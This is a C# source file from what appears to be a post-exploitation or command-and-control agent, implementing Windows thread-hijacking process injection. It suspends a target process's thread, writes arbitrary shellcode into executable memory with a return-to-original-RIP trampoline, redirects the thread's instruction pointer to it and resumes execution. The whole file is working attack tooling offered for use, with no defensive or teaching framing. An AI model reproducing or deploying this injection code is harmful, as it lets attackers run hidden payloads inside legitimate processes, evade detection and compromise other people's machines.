using System.Diagnostics;
using System.Runtime.InteropServices;
using Agent.Interfaces;
using Agent.Models;
using Microsoft.Win32.SafeHandles;

namespace Agent
{
    public interface IThreadHijackNative
    {
        IntPtr OpenThread(ThreadHijack.ThreadAccess access, bool inherit, uint threadId);
        uint SuspendThread(IntPtr thread);
        bool GetThreadContext(IntPtr thread, ref ThreadHijack.CONTEXT64 context);
        IntPtr OpenProcess(int access, bool inherit, int processId);
        IntPtr VirtualAllocEx(IntPtr process, IntPtr address, uint size, uint allocationType, uint protection);
        bool VirtualFreeEx(IntPtr process, IntPtr address, uint size, uint freeType);
        bool WriteProcessMemory(IntPtr process, IntPtr address, byte[] bytes, uint size, out UIntPtr bytesWritten);
        bool SetThreadContext(IntPtr thread, ref ThreadHijack.CONTEXT64 context);
        int ResumeThread(IntPtr thread);
        bool CloseHandle(IntPtr handle);
    }

    public sealed class ThreadHijack : ITechnique
    {
        private readonly IThreadHijackNative native;
        public ThreadHijack() : this(new WindowsThreadHijackNative()) { }
        public ThreadHijack(IThreadHijackNative native) => this.native = native;
        int ITechnique.id => 3;
        async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
        {
            if (!await spawner.Spawn(spawnOptions))
            {
                return false;
            }
            SafeProcessHandle hProc;
            if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc) ||
                hProc is null ||
                hProc.IsInvalid)
            {
                return false;
            }

            var processIdResolver = new ProcessHandleResolver(new ProcessHandleNative());
            int processId = processIdResolver.Resolve(hProc.DangerousGetHandle());
            using Process process = Process.GetProcessById(processId);

            if (process.Threads.Count == 0) return false;
            return InjectThread((uint)process.Threads[0].Id, process.Id, shellcode);
        }

        public bool InjectThread(uint threadId, int processId, byte[] payload)
        {
            IntPtr thread = native.OpenThread(ThreadAccess.THREAD_HIJACK, false, threadId);
            if (thread == IntPtr.Zero || thread == new IntPtr(-1)) return false;
            IntPtr process = IntPtr.Zero;
            IntPtr remote = IntPtr.Zero;
            bool suspended = false;
            bool contextPointsToRemote = false;
            int resumeAttempts = 0;
            try
            {
                if (native.SuspendThread(thread) == uint.MaxValue) return false;
                suspended = true;
                var context = new CONTEXT64 { ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL };
                if (!native.GetThreadContext(thread, ref context)) return false;
                CONTEXT64 originalContext = context;

                byte[] shellcode = new byte[payload.Length + 12];
                payload.CopyTo(shellcode, 0);
                new byte[] { 0x48, 0xb8 }.CopyTo(shellcode, payload.Length);
                BitConverter.GetBytes(context.Rip).CopyTo(shellcode, payload.Length + 2);
                new byte[] { 0xff, 0xe0 }.CopyTo(shellcode, payload.Length + 10);

                process = native.OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, processId);
                if (process == IntPtr.Zero || process == new IntPtr(-1)) return false;
                remote = native.VirtualAllocEx(process, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (remote == IntPtr.Zero) return false;
                if (!native.WriteProcessMemory(process, remote, shellcode, (uint)shellcode.Length, out UIntPtr written) || written.ToUInt64() != (ulong)shellcode.Length)
                    return false;
                context.Rip = (ulong)remote.ToInt64();
                if (!native.SetThreadContext(thread, ref context)) return false;
                contextPointsToRemote = true;
                resumeAttempts++;
                if (native.ResumeThread(thread) < 0)
                {
                    if (native.SetThreadContext(thread, ref originalContext))
                        contextPointsToRemote = false;
                    return false;
                }
                suspended = false;
                return true;
            }
            finally
            {
                if (remote != IntPtr.Zero && !contextPointsToRemote)
                    native.VirtualFreeEx(process, remote, 0, MEM_RELEASE);
                while (suspended && resumeAttempts < MAX_RESUME_ATTEMPTS)
                {
                    resumeAttempts++;
                    if (native.ResumeThread(thread) >= 0) suspended = false;
                }
                if (process != IntPtr.Zero) native.CloseHandle(process);
                native.CloseHandle(thread);
            }
        }

        private sealed class WindowsThreadHijackNative : IThreadHijackNative
        {
            public IntPtr OpenThread(ThreadAccess access, bool inherit, uint id) => ThreadHijack.OpenThread(access, inherit, id);
            public uint SuspendThread(IntPtr thread) => ThreadHijack.SuspendThread(thread);
            public bool GetThreadContext(IntPtr thread, ref CONTEXT64 context) => ThreadHijack.GetThreadContext(thread, ref context);
            public IntPtr OpenProcess(int access, bool inherit, int id) => ThreadHijack.OpenProcess(access, inherit, id);
            public IntPtr VirtualAllocEx(IntPtr process, IntPtr address, uint size, uint allocation, uint protection) => ThreadHijack.VirtualAllocEx(process, address, size, allocation, protection);
            public bool VirtualFreeEx(IntPtr process, IntPtr address, uint size, uint freeType) => ThreadHijack.VirtualFreeEx(process, address, size, freeType);
            public bool WriteProcessMemory(IntPtr process, IntPtr address, byte[] bytes, uint size, out UIntPtr written) => ThreadHijack.WriteProcessMemory(process, address, bytes, size, out written);
            public bool SetThreadContext(IntPtr thread, ref CONTEXT64 context) => ThreadHijack.SetThreadContext(thread, ref context);
            public int ResumeThread(IntPtr thread) => ThreadHijack.ResumeThread(thread);
            public bool CloseHandle(IntPtr handle) => ThreadHijack.CloseHandle(handle);
        }
        // Import API Functions 
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        static extern int ResumeThread(IntPtr hThread);

        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);


        // Process privileges
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        // Memory permissions
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint MEM_RELEASE = 0x00008000;
        const int MAX_RESUME_ATTEMPTS = 3;
        const uint PAGE_READWRITE = 4;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200),
            THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
        }

        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }

        // x86 float save
        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        // x86 context structure (not used in this example)
        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags; //set this to an appropriate value 
                                      // Retrieved by CONTEXT_DEBUG_REGISTERS 
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            // Retrieved by CONTEXT_FLOATING_POINT 
            public FLOATING_SAVE_AREA FloatSave;
            // Retrieved by CONTEXT_SEGMENTS 
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            // Retrieved by CONTEXT_INTEGER 
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            // Retrieved by CONTEXT_CONTROL 
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            // Retrieved by CONTEXT_EXTENDED_REGISTERS 
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        // x64 m128a
        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        // x64 save format
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        // x64 context structure
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

    }
}
